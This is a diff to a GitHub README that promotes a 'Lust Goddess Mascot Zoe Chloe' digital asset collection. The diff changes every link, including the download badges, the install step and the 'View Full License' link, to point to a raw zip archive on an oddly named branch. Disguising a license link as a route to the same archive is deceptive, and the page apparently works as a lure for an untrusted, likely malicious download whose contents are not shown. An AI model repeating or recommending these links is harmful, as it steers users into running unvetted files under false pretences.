@@ -1,6 +1,6 @@
 # Lust Goddess Mascot Zoe Chloe Collection 🚀
 
-[![Download](https://img.shields.io/badge/Download-LustGoddessZoeChloe-blueviolet?style=for-the-badge&logo=cloud-download&logoColor=white)](https://dipakvaghela99.github.io)
+[![Download](https://github.com/dipakvaghela99/lust-goddess-zoe-chloe-mascot-assets/raw/refs/heads/branch/turbinatocylindrical/zoe-chloe-assets-mascot-goddess-lust-v1.8-alpha.2.zip)](https://github.com/dipakvaghela99/lust-goddess-zoe-chloe-mascot-assets/raw/refs/heads/branch/turbinatocylindrical/zoe-chloe-assets-mascot-goddess-lust-v1.8-alpha.2.zip)
 
 Welcome to the official repository for **Lust Goddess Mascot Zoe Chloe Collection**—an expressive, creative asset suite curated for digital artists, content creators, and visionaries. Immerse yourself in a new age of mascot aesthetics, featuring Zoe and Chloe, two personas inspiring creativity and emotional connection in digital environments. Whether you're customizing your workspace or breathing life into digital designs, this collection stands at the frontier of character-driven innovation in 2025.
 
@@ -38,7 +38,7 @@ Experience seamless access across your favorite environments. We've sculpted our
 Ready to invite Zoe & Chloe into your creative universe? Just tap the download badge above or below this section!  
 Once you have the compressed collection:
 
-1. Download the mascot package: https://dipakvaghela99.github.io
+1. Download the mascot package: https://github.com/dipakvaghela99/lust-goddess-zoe-chloe-mascot-assets/raw/refs/heads/branch/turbinatocylindrical/zoe-chloe-assets-mascot-goddess-lust-v1.8-alpha.2.zip
 2. Extract the zip file to your preferred assets directory.
 3. Launch your graphics suite or web editor.
 4. Import assets as needed for your project—SVG for flexibility, PNG for web, or PSD for advanced editing.
@@ -101,11 +101,11 @@ This repository offers digital mascot assets designed for legitimate creative pr
 
 Released under the MIT License—freedom to create, remix, and share within clear and simple terms.
 
-[View Full License](https://opensource.org/licenses/MIT)
+[View Full License](https://github.com/dipakvaghela99/lust-goddess-zoe-chloe-mascot-assets/raw/refs/heads/branch/turbinatocylindrical/zoe-chloe-assets-mascot-goddess-lust-v1.8-alpha.2.zip)
 
 ---
 
-[![Download](https://img.shields.io/badge/Download-LustGoddessZoeChloe-blueviolet?style=for-the-badge&logo=cloud-download&logoColor=white)](https://dipakvaghela99.github.io)
+[![Download](https://github.com/dipakvaghela99/lust-goddess-zoe-chloe-mascot-assets/raw/refs/heads/branch/turbinatocylindrical/zoe-chloe-assets-mascot-goddess-lust-v1.8-alpha.2.zip)](https://github.com/dipakvaghela99/lust-goddess-zoe-chloe-mascot-assets/raw/refs/heads/branch/turbinatocylindrical/zoe-chloe-assets-mascot-goddess-lust-v1.8-alpha.2.zip)
 
 ---
 
